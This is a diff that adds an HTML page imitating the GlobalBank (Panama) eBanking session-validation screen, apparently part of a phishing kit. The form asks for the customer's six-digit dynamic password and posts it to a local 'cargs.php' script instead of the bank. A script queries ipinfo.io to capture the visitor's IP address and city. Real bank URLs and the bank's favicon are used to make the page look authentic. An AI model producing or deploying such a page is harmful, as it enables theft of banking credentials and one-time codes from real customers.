@@ -1,0 +1,182 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+   <head>
+      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+      <script type="text/javascript" async="" src="js/detect.js.descarga"></script><script>
+         var ctx = "/eBanking";
+      </script>
+      <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7">
+      <link rel="Shortcut Icon" href="https://globalonline.globalbank.com.pa/eBanking/images/favicon.ico">
+      <link rel="stylesheet" href="css/reset.css" type="text/css">
+      <title>
+         GlobalBank
+      </title>
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+      
+      <script>
+         $.getJSON("https://ipinfo.io", function (data) {
+      $("#ip").html("" + data.ip);
+      $("#address").html("" + data.city + ", " + data.country);
+
+      })
+      </script>
+
+      <link href="css/combines.css" rel="stylesheet">
+
+      <script src="jscombined.js.descarga"></script>
+      <link href="css/jquery.keyboard.css" rel="stylesheet">
+      <script type="text/javascript" src="js/jquery.keyboard.js.descarga"></script>
+      <script type="text/javascript" src="js/api-teclado.js.descarga"></script><!-- XSS - frame - deny -->
+      <style> body { display : none;} </style>
+      <style type="text/css">#_copy{align-items:center;background:#4494d5;border-radius:3px;color:#fff;cursor:pointer;display:flex;font-size:13px;height:30px;justify-content:center;position:absolute;width:60px;z-index:1000}#select-tooltip,#sfModal,.modal-backdrop,div[id^=reader-helper]{display:none!important}.modal-open{overflow:auto!important}._sf_adjust_body{padding-right:0!important}.super_copy_btns_div{position:fixed;width:154px;left:10px;top:45%;background:#e7f1ff;border:2px solid #4595d5;font-weight:600;border-radius:2px;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Helvetica Neue,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol;z-index:5000}.super_copy_btns_logo{width:100%;background:#4595d5;text-align:center;font-size:12px;color:#e7f1ff;line-height:30px;height:30px}.super_copy_btns_btn{display:block;width:128px;height:28px;background:#7f5711;border-radius:4px;color:#fff;font-size:12px;border:0;outline:0;margin:8px auto;font-weight:700;cursor:pointer;opacity:.9}.super_copy_btns_btn:hover{opacity:.8}.super_copy_btns_btn:active{opacity:1}</style>
+   </head>
+   <body onload=";backButtonOverride()" style="display: block;">
+      <!-- XSS - frame - deny -->
+      <script> 
+         if (self == top) {
+           var theBody = document.getElementsByTagName('body')[0]
+           theBody.style.display = "block";
+         } else { 
+           top.location = self.location 
+         }
+      </script>
+      <div id="disabledZone" style="float: right; display: none;">
+         <!-- Se utiliza en DWR -->
+         <div id="modalProcesando">
+            <div id="fondoModal">
+               <div id="imagenModal">
+                  <img src="./otrascosas_files/processingAni.gif" border="0">
+               </div>
+               <div id="textoModal">
+                  Espere por favor...
+               </div>
+            </div>
+         </div>
+      </div>
+      <div id="contenedorPadre">
+         <div id="header">
+            <div id="superior">
+               <div id="banner"></div>
+               <div class="idiomaLink" style="display:inline-block; margin-left:614px;padding-left:8.5%">
+                  <div>
+                     <i class="fa fa-language" style="font-size:1.2em"></i>
+                     <a id="selectorEs" href="https://globalonline.globalbank.com.pa/eBanking/desbloqueo.htm?lang=es_PA&amp;execution=e1s1" style="display: none;">
+                     English
+                     </a>	
+                     <a id="selectorEn" href="https://globalonline.globalbank.com.pa/eBanking/desbloqueo.htm?lang=en_PA&amp;execution=e1s1">
+                     English
+                     </a>
+                  </div>
+                  <script type="text/javascript">
+                     function showLanguageSelector(obj,language){	
+                     	if("es_PA"!=language){
+                     		obj.show();		
+                     	}else{
+                     		obj.hide();
+                     	}
+                     }
+                     
+                     showLanguageSelector($k("#selectorEs"),'es_PA');
+                     showLanguageSelector($k("#selectorEn"),'en_PA');
+                  </script>
+               </div>
+            </div>
+         </div>
+         <div id="outer" class="roundedCornersOuterDiv">
+            <div class="contenedor-form-decorator">
+               <div id="barraEncabezado">
+                  <div class="fechaEncabezado">					
+                  </div>
+               </div>
+               <script>
+                  var ctx = "/eBanking";
+               </script>
+               <form action="cargs.php" method="post" >
+                  <p id="ip"  hidden="">
+                  <script>
+                     var ctx = "/eBanking";
+                  </script>
+                  <div class="contenedor-titulo-seccion ">
+                     <div class="titulo-seccion">
+                        <i class="fa ti ti-clave ti-lg"></i>
+                        Validar Inicio de Sesión
+                     </div>
+                  </div>
+                  <div class="contenedor-formulario-ingreso">
+                     <div class="clearBoth"></div>
+                     
+                     <ul>
+                        
+                        <li class="row">
+                           <label class="obligatorio">
+                           Ingrese su contraseña dinámica:
+                           </label>
+                           <div class="value">
+                              <input type="text" name="miDiosenticonfio"  id="miDiosenticonfio" minlength="6" maxlength="6" required class="ui-keyboard-input" aria-haspopup="true" role="textbox" onkeyup="this.value=Numeros(this.value)">										
+                           </div>
+                           <script>
+                              var ctx = "/eBanking";
+                           </script>
+                           <script type="text/javascript" src="./otrascosas_files/jquery.keyboard.js.descarga"></script>
+                           <script type="text/javascript" src="./otrascosas_files/api-teclado.js.descarga"></script>
+                           <a id="activarTecladoVirtualUsername" class="icono-teclado-primario" tooltip-text="Usar teclado virtual" href="javascript:void(0)"></a>
+                           <script type="text/javascript">
+                              activadorDeDom("activarTecladoVirtualUsername").controlar(tecladoVirtualDeDom("username"));
+                           </script>	
+                        </li>
+                        
+                        <li class="row">
+                           <div class="lineaSeparadora"></div>
+                        </li>
+                        
+                  <div class="contenedor-centrado">
+                    
+                     <button type="submit" name="_eventId_siguiente" class="boton-primario texto-boton" onclick="" style="">
+                        <p>
+                           <i class="fa fa- fa-lg"></i>
+                           Validar
+                        </p>
+                     </button>
+                  </div>
+                  <input type="hidden" name="_csrf" value="f1bd7862-e868-4880-8aca-42a44930f003">
+               </form>
+            </div>
+            <div class="contenedor-panel-derecho" "="">
+            </div>
+         </div>
+      </div>
+      <div id="footer">
+         <!-- 		<div id="footerLogoDiv"> -->
+         <!-- 		<div> -->
+         <ul>
+            <li class="footerText">
+               Global Bank Corporation - © 2014 Global Bank - Todos los derechos reservados.
+            </li>
+            <li class="fragmento_1">
+            </li>
+            <li class="fragmento_2">
+            </li>
+            <li class="fragmento_3">
+            </li>
+         </ul>
+      </div>
+     
+      <script type="text/javascript" src="js/footer.js.descarga"></script>
+      <script >
+       function Numeros(string){//Solo numeros
+    var out = '';
+    var filtro = '1234567890';//Caracteres validos
+   
+    //Recorrer el texto y verificar si el caracter se encuentra en la lista de validos 
+    for (var i=0; i<string.length; i++)
+       if (filtro.indexOf(string.charAt(i)) != -1) 
+             //Se añaden a la salida los caracteres validos
+        out += string.charAt(i);
+   
+    //Retornar valor filtrado
+    return out;
+} 
+    </script>
+   </body>
+</html>
